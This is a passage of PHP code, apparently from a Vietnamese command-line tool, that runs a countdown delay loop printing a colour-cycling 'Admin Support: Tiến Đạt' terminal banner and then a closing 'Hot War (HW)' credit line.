        for($tt = $delay ;$tt>= 1;$tt--){
        echo "\r\033[1;31m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[1;36m | $tt | "; usleep(150000);
        echo "\r\033[1;32m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;33m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;34m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;35m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;36m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;37m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;31m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);
        echo "\r\033[1;33m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000); 
        echo "\r\033[1;35m   𝐀𝐝𝐦𝐢𝐧 𝐒𝐮𝐩𝐩𝐨𝐫𝐭: 𝓣𝓲ế𝓷 Đạ𝓽 \033[0;36m | $tt | "; usleep(150000);}
echo "\r\e[1;33m    🌸🌹Tiến Đạt 🌹🐲 Hot War ( HW )                       \r";
}